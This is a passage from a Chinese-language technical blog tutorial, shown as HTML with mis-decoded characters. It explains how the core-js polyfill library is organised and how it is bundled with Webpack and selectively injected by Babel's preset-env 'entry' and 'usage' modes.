<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrNew)
<span class="hljs-comment">/* è¾“å‡ºç»“æœ
const arrNew = arr.groupBy(item =&gt; item.group);
                   ^
TypeError: arr.groupBy is not a function
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œä¸å¼•å…¥core-jsæ—¶ä¸æ”¯æŒï¼Œå¼•å…¥äº†core-js/actualï¼ˆåŒ…å«stage3é˜¶æ®µçš„APIï¼‰åæ”¯æŒå¹¶èƒ½è¾“å‡ºæ­£ç¡®çš„ç»“æœã€‚core-js/stableä¸­ä¸æ”¯æŒåˆæŠ¥é”™äº†ã€‚</p>
<h2 data-id="heading-6">core-jsæºç ç»“æ„</h2>
<p>å‰é¢æè¿°äº†å¾ˆå¤šcore-jsçš„å¼•å…¥æ–¹å¼ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æºç ç»“æ„ï¼Œçœ‹çœ‹core-jså†…éƒ¨æ˜¯å¦‚ä½•ç»„ç»‡çš„ã€‚</p>
<h3 data-id="heading-7">core-jsæºç ç›®å½•</h3>
<pre><code class="hljs language-erlang" lang="erlang">core-js
â”œâ”€actual
â”‚   â”œâ”€array
â”‚   â”‚  â”œâ”€at.js
â”‚   â”‚  â”œâ”€concat.js
â”‚   â”‚  â””â”€...
â”‚   â”œâ”€set
â”‚   â”‚  â””â”€...
â”‚   â””â”€...
â”œâ”€es
â”‚   â””â”€...
â”œâ”€features
â”‚   â””â”€...
â”œâ”€index.js
â””â”€...
</code></pre>
<p>é¦–å…ˆåˆ—å‡ºcore-jsæºç ç›®å½•çš„ç¤ºæ„å›¾ï¼Œå¯ä»¥çœ‹åˆ°core-jså†…éƒ¨æœ‰å¾ˆå¤šç›®å½•ï¼Œå¯¹åº”å‰é¢çš„å„ç§å¼•å…¥æ–¹å¼ã€‚è¿™é‡Œæˆ‘ä»¬åˆ—å‡ºæ¯ä¸ªç›®å½•çš„å†…å®¹ï¼š</p>
<ul>
<li>actual åŒ…å«ç¨³å®šçš„ESå’ŒWebæ ‡å‡†ç‰¹æ€§ï¼Œä»¥åŠstage3çš„ç‰¹æ€§</li>
<li>es åŒ…å«ç¨³å®šçš„ESç‰¹æ€§</li>
<li>features æ²¡æœ‰è¯´æ˜ï¼ŒçŒœæµ‹å’Œfullç±»ä¼¼</li>
<li>full æ‰€ä»¥ç‰¹æ€§åŒ…æ‹¬æ—©æœŸæè®®</li>
<li>internals åŒ…å†…éƒ¨ä½¿ç”¨çš„é€»è¾‘</li>
<li>modules å®é™…ç‰¹æ€§çš„ä»£ç å®ç°</li>
<li>proposals åŒ…å«æè®®çš„ç‰¹æ€§</li>
<li>stable åŒ…å«ç¨³å®šçš„ESå’ŒWebæ ‡å‡†ç‰¹æ€§</li>
<li>stage æŒ‰ç…§stageé˜¶æ®µåˆ—å‡ºæè®®ç‰¹æ€§</li>
<li>web åŒ…å«Webæ ‡å‡†ç‰¹æ€§</li>
<li>configurator.js æ˜¯å¦å¼ºåˆ¶å¼•å…¥é€»è¾‘ï¼Œåé¢ä¼šæè¿°</li>
<li>index.js å†…å®¹ä¸ºå¯¼å‡ºfullç›®å½•ï¼Œå› æ­¤å¯¼å…¥core-jsç­‰äºå¯¼å…¥core-js/full</li>
</ul>
<h3 data-id="heading-8">å±‚å±‚å¼•ç”¨</h3>
<p>åœ¨ç›®å½•ä¸­actual, es, full, stable, esæ˜¯æˆ‘ä»¬å·²ç»ä»‹ç»è¿‡çš„ã€‚å¦å¤–è¿˜æœ‰webç›®å½•ä»…åŒ…å«webæ ‡å‡†çš„ç‰¹æ€§ï¼Œfeatureså’Œfullç±»ä¼¼ï¼ˆindex.jsä¸­ç›´æ¥å¯¼å‡ºfullç›®å½•ï¼‰ã€‚</p>
<p>proposalsç›®å½•åŒ…å«æè®®çš„ç‰¹æ€§ï¼Œä»¥ç‰¹æ€§åæ¥å‘½åæ–‡ä»¶åã€‚è€Œstageç›®å½•ä¸­åŒ…å«0.js, 1.js, 2.jsç­‰ç­‰ï¼Œæ˜¯æ ¹æ®stageé˜¶æ®µæ¥æ•´ç†çš„ï¼Œæ–¹ä¾¿æ•´ç†å’Œå¼•å…¥å¯¹åº”é˜¶æ®µçš„ç‰¹æ€§ã€‚</p>
<p>è¿™æ ·æ•´ç†ç›®å½•è™½ç„¶æ¸…æ™°ï¼Œä½†è¿™äº›ç›®å½•ä¸­çš„ç‰¹æ€§éƒ½æ˜¯é‡å¤çš„ï¼Œä¸å¯èƒ½åœ¨æ¯ä¸ªç›®å½•ä¸­æŠŠç‰¹æ€§éƒ½å®ç°ä¸€éã€‚å› æ­¤ä¸Šé¢è¿™äº›ç›®å½•çš„æ–‡ä»¶ä¸­ï¼Œå­˜æ”¾çš„éƒ½æ˜¯å®ç°çš„å¼•ç”¨ï¼Œå¹¶ä¸æ˜¯ç‰¹æ€§ä»£ç å®ç°æœ¬èº«ã€‚çœŸæ­£çš„å®ç°åœ¨modulesç›®å½•ä¸­ã€‚modulesç›®å½•ä¸­æ˜¯ä»¥ç‰¹æ€§åä½œä¸ºå‘½åçš„æ–‡ä»¶ï¼Œæ–‡ä»¶æœ‰å›ºå®šçš„å‰ç¼€åï¼šes.è¡¨ç¤ºESæ ‡å‡†ï¼›esnext.è¡¨ç¤ºæè®®ä¸­çš„æ ‡å‡†ï¼›web.è¡¨ç¤ºwebæ ‡å‡†ã€‚</p>
<p>è¿™é‡Œä»¥æˆ‘ä»¬ä¸Šé¢æåˆ°è¿‡çš„ä¸¤ä¸ªç‰¹æ€§ä¸ºä¾‹ï¼Œçœ‹çœ‹å¼•ç”¨è·¯å¾„ï¼Œé¦–å…ˆæ˜¯Promise.tryï¼š</p>
<ul>
<li>ä½¿ç”¨è€…å¼•å…¥ core-js/full/promise/try.js</li>
<li>å¼•å…¥ actual/promise/try.js</li>
<li>å¼•å…¥ actual/promise/try.js</li>
<li>å¼•å…¥ stable/promise/try.js</li>
<li>å¼•å…¥ es/promise/try.js</li>
<li>æœ€ç»ˆå¼•å…¥ modules/es.promise.try.js</li>
</ul>
<p>ç„¶åæ˜¯groupByæ–¹æ³•ï¼š</p>
<ul>
<li>ä½¿ç”¨è€…å¼•å…¥ core-js/actual/array/group-by.js</li>
<li>æœ€ç»ˆå¼•å…¥ modules/esnext.array.group-by.js</li>
</ul>
<p>å¯ä»¥çœ‹åˆ°ï¼Œcore-jså†…éƒ¨çš„ç‰¹æ€§æ˜¯ç»è¿‡å±‚å±‚å¼•å…¥ï¼Œæœ€ç»ˆå¼•å…¥å…·ä½“çš„å®ç°ä»£ç çš„ã€‚</p>
<h3 data-id="heading-9">core-js-pureä¸core-js-bundle</h3>
<p>é™¤äº†core-jsä¹‹å¤–ï¼Œcore-js-pureä¸core-js-bundleè¿™ä¸¤ä¸ªåŒ…ä¹Ÿæä¾›äº†å…¼å®¹æ€§ã€‚core-js-pureå†…éƒ¨çš„ç›®å½•ç»“æ„ä¸core-jsä¸€è‡´ï¼Œåªä¸è¿‡core-js-pureä¸å°†ç‰¹æ€§æ³¨å…¥åˆ°å…¨å±€ã€‚core-js-bundleæ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒæ˜¯å°†core-jsä»£ç ç»è¿‡æ‰“åŒ…åå†æä¾›ï¼Œå®ƒçš„ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">core-js-bundle
â”œâ”€index.js
â”œâ”€minified.js
â”œâ”€minified.js.map
â””â”€...
</code></pre>
<p>å…¶ä¸­index.jsæ˜¯æ‰“åŒ…è¿‡åçš„ç‰¹æ€§é›†åˆä»£ç ï¼Œminified.jsæ˜¯ç»è¿‡å‹ç¼©æ··æ·†åçš„ä»£ç ã€‚core-js-bundleåªèƒ½å…¨éƒ¨å¼•å…¥å¹¶æ³¨å…¥åˆ°å…¨å±€ï¼Œä¸èƒ½å¼•å…¥éƒ¨åˆ†ç›®å½•æˆ–è€…å¯¼å‡ºæŸä¸ªå±æ€§ã€‚</p>
<h2 data-id="heading-10">æ‰“åŒ…å’Œæµè§ˆå™¨æ•ˆæœ</h2>
<h3 data-id="heading-11">åˆ›å»ºWebpackç¤ºä¾‹</h3>
<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªWebapcké¡¹ç›®ï¼Œæ–¹ä¾¿åç»­æ‰“åŒ…æŸ¥çœ‹æ•ˆæœã€‚é¦–å…ˆæ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºé¡¹ç›®</span>
npm init -y
<span class="hljs-comment"># å®‰è£…webpackä¾èµ–</span>
npm add webpack webpack-cli html-webpack-plugin
<span class="hljs-comment"># å®‰è£…core-jsä¾èµ–</span>
npm add core-js core-js-pure core-js-bundle
</code></pre>
<p>åˆ›å»ºsrc/index.jsï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
</code></pre>
<p>åœ¨package.jsonæ–‡ä»¶çš„scriptsä¸­å¢åŠ å‘½ä»¤ï¼š"build": "webpack"ã€‚æœ€åæ˜¯Webpacké…ç½®æ–‡ä»¶webpack.config.js:</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">HtmlWebpackPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'html-webpack-plugin'</span>);

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">mode</span>: <span class="hljs-string">'production'</span>, <span class="hljs-comment">// ç”Ÿäº§æ¨¡å¼</span>
  <span class="hljs-attr">entry</span>: <span class="hljs-string">'./src/index.js'</span>, <span class="hljs-comment">// æºç å…¥å£</span>
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>({ <span class="hljs-comment">// ç”ŸæˆHTMLé¡µé¢å…¥å£</span>
      <span class="hljs-attr">title</span>: <span class="hljs-string">'jzplpçš„core-jså®éªŒ'</span>, <span class="hljs-comment">// é¡µé¢æ ‡é¢˜</span>
    }),
  ],
  <span class="hljs-attr">output</span>: {
    <span class="hljs-attr">filename</span>: <span class="hljs-string">'main.js'</span>, <span class="hljs-comment">// ç”Ÿæˆæ–‡ä»¶å</span>
    <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'dist'</span>),  <span class="hljs-comment">// ç”Ÿæˆæ–‡ä»¶ç›®å½•</span>
    <span class="hljs-attr">clean</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// ç”Ÿæˆå‰åˆ é™¤distç›®å½•å†…å®¹</span>
  },
};
</code></pre>
<p>å‘½ä»¤è¡Œè¿è¡Œnpm run buildï¼Œå³å¯ä½¿ç”¨Webpackæ‰“åŒ…ã€‚åœ¨distç›®å½•ä¸­ç”Ÿæˆäº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯main.jsï¼Œé‡Œé¢æ˜¯æ‰“åŒ…åçš„jsä»£ç ï¼›index.htmlå¯ä»¥è®©æˆ‘ä»¬åœ¨æµè§ˆå™¨æŸ¥çœ‹æ•ˆæœã€‚ç”±äºæˆ‘ä»¬æ²¡æœ‰å¼•å…¥core-jsï¼Œæµè§ˆå™¨æ²¡æœ‰é¢„ç½®lastIndexè¿™ä¸ªæè®®ä¸­çš„ç‰¹æ€§ï¼Œå› æ­¤è¾“å‡ºundefinedã€‚</p>
<h3 data-id="heading-12">core-jsæ‰“åŒ…</h3>
<p>è¿™é‡Œå¼•å…¥core-jsï¼Œç„¶åæ‰“åŒ…æŸ¥çœ‹æ•ˆæœã€‚é¦–å…ˆæ˜¯å…¨é‡å¼•å…¥ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js"</span>);
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
</code></pre>
<p>æ­¤æ—¶æµè§ˆå™¨è¾“å‡º1ï¼Œè¡¨ç¤ºcore-jsæ³¨å…¥æˆåŠŸï¼ŒlastIndexç‰¹æ€§ç”Ÿæ•ˆäº†ã€‚ä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹main.jsï¼Œå‘ç°å±…ç„¶æœ‰267KBã€‚è¿™æ˜¯å› ä¸ºå®ƒæŠŠæ‰€æœ‰ç‰¹æ€§éƒ½å¼•å…¥äº†ã€‚</p>
<p>å¦‚æœå¼•å…¥<code>require("core-js/full/array")</code>ï¼Œæ­¤æ—¶æ–°ç‰¹æ€§ä¹Ÿå¯ä»¥ç”Ÿæ•ˆã€‚å› ä¸ºåªå¼•å…¥äº†æ•°ç»„ç›¸å…³ç‰¹æ€§ï¼Œå› æ­¤main.jsçš„å¤§å°ä¸º59.3KBï¼Œæ¯”å…¨é‡å¼•å…¥å°å¾ˆå¤šã€‚</p>
<p>å¦‚æœå¼•å…¥<code>require("core-js/full/array/last-index")</code>ï¼Œæ­¤æ—¶æ–°ç‰¹æ€§ä¹Ÿå¯ä»¥ç”Ÿæ•ˆã€‚å› ä¸ºåªå¼•å…¥äº†è¿™ä¸€ä¸ªç‰¹æ€§ï¼Œå› æ­¤main.jsçš„å¤§å°ä¸º12.2KBã€‚</p>
<h2 data-id="heading-13">Babelä¸core-js</h2>
<p>ä»å‰é¢æ‰“åŒ…çš„ä¾‹å­ä¸­å¯ä»¥çœ‹åˆ°ï¼Œcore-jsæ•´ä¸ªæ‰“åŒ…è¿›é¡¹ç›®ä¸­æ˜¯éå¸¸å·¨å¤§çš„ï¼Œå¯èƒ½æ¯”ä½ æ­£å¸¸é¡¹ç›®çš„å¤§å°è¿˜è¦æ›´å¤§ã€‚è¿™æ ·æ˜æ˜¾ä¼šé€ æˆå ç”¨èµ„æºæ›´å¤šï¼Œé¡µé¢åŠ è½½æ—¶é—´å˜æ…¢ç­‰é—®é¢˜ã€‚ä¸€ä¸ªè§£å†³åŠæ³•æ˜¯ï¼Œåªå¼•å…¥æˆ‘ä»¬ä»£ç ä¸­ä½¿ç”¨åˆ°çš„ç‰¹æ€§ï¼Œä»¥åŠæˆ‘ä»¬è¦é€‚é…çš„æµè§ˆå™¨ç‰ˆæœ¬ä¸­ä¸å…¼å®¹çš„ç‰¹æ€§ï¼Œç”¨ä¸åˆ°çš„ç‰¹æ€§ä¸æ‰“åŒ…è¿›ä»£ç ä¸­ã€‚Babelå°±æä¾›äº†è¿™æ ·çš„åŠŸèƒ½ã€‚</p>
<h3 data-id="heading-14">åˆ›å»ºBabelç¤ºä¾‹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºé¡¹ç›®</span>
npm init -y
<span class="hljs-comment"># å®‰è£…webpackä¾èµ–</span>
npm add @babel/core @babel/cli @babel/preset-env
<span class="hljs-comment"># å®‰è£…core-jsä¾èµ–</span>
npm add core-js core-js-pure core-js-bundle
</code></pre>
<p>åˆ›å»ºsrc/index.jsï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<p>åœ¨package.jsonæ–‡ä»¶çš„scriptsä¸­å¢åŠ å‘½ä»¤ï¼š"babel": "babel src --out-dir lib"ã€‚æœ€åæ˜¯Babelé…ç½®æ–‡ä»¶babel.config.json:</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"presets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"@babel/preset-env"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"targets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"chrome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100"</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>targetsä¸­è¡¨ç¤ºæˆ‘ä»¬éœ€è¦å…¼å®¹çš„æµè§ˆå™¨ç‰ˆæœ¬ã€‚æ‰§è¡Œnpm run babelï¼Œç”Ÿæˆç»“æœå†lib/index.jsä¸­ï¼Œå†…å®¹å¦‚ä¸‹ã€‚å¯ä»¥çœ‹åˆ°æœªå¯¹core-jsåšä»»ä½•å¤„ç†ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<h3 data-id="heading-15">preset-envé…ç½®entry</h3>
<p>@babel/preset-envæ˜¯ä¸€ä¸ªBabelé¢„è®¾ï¼Œå¯ä»¥æ ¹æ®é…ç½®ä¸ºä»£ç å¢åŠ å…¼å®¹æ€§å¤„ç†ã€‚å‰é¢åˆ›å»ºBabelç¤ºä¾‹æ—¶å·²ç»å¢åŠ äº†è¿™ä¸ªé¢„è®¾ï¼Œä½†æ˜¯æ²¡æœ‰å¢åŠ core-jsé…ç½®ã€‚è¿™é‡Œæˆ‘ä»¬åŠ ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"presets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"@babel/preset-env"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"targets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"chrome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"useBuiltIns"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"entry"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"corejs"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"3.47.0"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è¿™é‡Œå¢åŠ äº†corejsç‰ˆæœ¬å’ŒuseBuiltInsé…ç½®ï¼Œå€¼ä¸ºentryã€‚é…ç½®è¿™ä¸ªå€¼ï¼Œä¼šä½¿å¾—@babel/preset-envæ ¹æ®é…ç½®çš„æµè§ˆå™¨ç‰ˆæœ¬å…¼å®¹æ€§ï¼Œé€‰æ‹©å¼•å…¥å“ªäº›core-jsä¸­çš„ç‰¹æ€§ã€‚è¿™é‡Œå†æ‰§è¡Œå‘½ä»¤è¡Œï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.async-dispose.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.dispose.js"</span>);
<span class="hljs-comment">// ... æ›´å¤šesç‰¹æ€§çœç•¥</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/esnext.array.filter-out.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/esnext.array.filter-reject.js"</span>);
<span class="hljs-comment">// ... æ›´å¤šesnextç‰¹æ€§çœç•¥</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-exception.stack.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.immediate.js"</span>);
<span class="hljs-comment">// ... æ›´å¤šwebç‰¹æ€§çœç•¥</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<p>å¯ä»¥çœ‹åˆ°core-jsè¢«æ‹†å¼€ï¼Œç›´æ¥å¼•å…¥äº†ç‰¹æ€§æœ¬èº«ã€‚åœ¨é…ç½®chrome: 100ç‰ˆæœ¬æ—¶ï¼Œå¼•å…¥çš„ç‰¹æ€§ä¸º215ä¸ªã€‚æˆ‘ä»¬ä¿®æ”¹é…ç½®chrome: 140ç‰ˆæœ¬æ—¶ï¼Œå†é‡æ–°ç”Ÿæˆä»£ç ï¼Œæ­¤æ—¶å¼•å…¥çš„ç‰¹æ€§ä¸º150ä¸ªã€‚å¯ä»¥çœ‹åˆ°ç¡®å®æ—¶æ ¹æ®æµè§ˆå™¨ç‰ˆæœ¬é€‰æ‹©ä¸åŒçš„ç‰¹æ€§å¼•å…¥ã€‚è¿™å¯¹äºå…¶å®ƒcore-jsçš„å¼•å…¥æ–¹å¼ä¹Ÿç”Ÿæ•ˆï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æºä»£ç </span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/stable'</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;

<span class="hljs-comment">// ç”Ÿæˆä»£ç </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.async-dispose.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.dispose.js"</span>);
<span class="hljs-comment">// ... æ›´å¤šesç‰¹æ€§çœç•¥</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-exception.stack.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.immediate.js"</span>);
<span class="hljs-comment">// ... æ›´å¤šwebç‰¹æ€§çœç•¥</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<p>æˆ‘ä»¬å¼•å…¥core-js/stableï¼Œå¯ä»¥çœ‹åˆ°ç”Ÿæˆä»£ç ä¸­ä¸å¼•å…¥esnextç‰¹æ€§äº†ã€‚åœ¨é…ç½®chrome: 100ç‰ˆæœ¬æ—¶ï¼Œå¼•å…¥çš„ç‰¹æ€§ä¸º71ä¸ªï¼Œé…ç½®chrome: 100ç‰ˆæœ¬æ—¶ï¼Œå¼•å…¥çš„ç‰¹æ€§ä¸º6ä¸ªã€‚åŒæ ·çš„ï¼Œå¦‚æœå¼•å…¥æ¢æˆcore-js/full/arrayï¼Œå°±ä¼šåªå¼•å…¥æ•°ç»„ç›¸å…³ç‰¹æ€§ï¼Œè€Œä¸”ä¹Ÿæ˜¯æ ¹æ®æµè§ˆå™¨å…¼å®¹ç‰ˆæœ¬å¼•å…¥ã€‚</p>
<h3 data-id="heading-16">preset-envé…ç½®usage</h3>
<p>@babel/preset-envçš„useBuiltInsé…ç½®å€¼ä¸ºusageæ—¶ï¼ŒBabelä¸ä»…ä¼šè·Ÿæ ¹æ®é…ç½®çš„æµè§ˆå™¨ç‰ˆæœ¬å…¼å®¹æ€§ï¼Œè¿˜ä¼šæ ¹æ®ä»£ç ä¸­å®é™…ä½¿ç”¨çš„ç‰¹æ€§æ¥é€‰æ‹©å¼•å…¥å“ªäº›core-jsä¸­çš„ç‰¹æ€§ã€‚é¦–å…ˆæ˜¯Babelé…ç½®ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"presets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"@babel/preset-env"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"targets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"chrome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"useBuiltIns"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"usage"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"corejs"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"3.47.0"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ç„¶åæ˜¯è¦å¤„ç†çš„ä»£ç ï¼Œæ³¨æ„é…ç½®usageæ—¶æ˜¯ä¸éœ€è¦æ‰‹åŠ¨å¼•å…¥core-jsçš„ã€‚æˆ‘ä»¬é…ç½®ä¸åŒçš„Chromeæµè§ˆå™¨ç‰ˆæœ¬ï¼Œçœ‹çœ‹è¾“å‡ºç»“æœå¦‚ä½•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æºä»£ç </span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-comment">// chrome 50 ç”Ÿæˆä»£ç  </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.array.iterator.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.map.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-collections.iterator.js"</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-comment">// chrome 100 ç”Ÿæˆä»£ç  </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
</code></pre>
<p>é¦–å…ˆå¯ä»¥çœ‹åˆ°ï¼Œå¼•å…¥core-jsä¸­çš„ç‰¹æ€§æ•°é‡å˜å¾—éå¸¸å°‘äº†ï¼Œä»£ç ä¸­æ²¡æœ‰ç”¨åˆ°çš„ç‰¹æ€§ä¸å†å¼•å…¥ã€‚å…¶æ¬¡ä¸åŒçš„æµè§ˆå™¨ç‰ˆæœ¬å¼•å…¥çš„ç‰¹æ€§ä¸ä¸€æ ·ï¼Œå› æ­¤è¿˜æ˜¯ä¼šæ ¹æ®æµè§ˆå™¨å…¼å®¹æ€§å¼•å…¥ç‰¹æ€§ã€‚æˆ‘ä»¬å†ä¿®æ”¹ä¸€ä¸‹æºä»£ç è¯•è¯•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æºä»£ç </span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span>{});

<span class="hljs-comment">// chrome 50 ç”Ÿæˆä»£ç  </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.array.iterator.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.map.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.try.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-collections.iterator.js"</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {});

<span class="hljs-comment">// chrome 100 ç”Ÿæˆä»£ç  </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.try.js"</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {});
</code></pre>
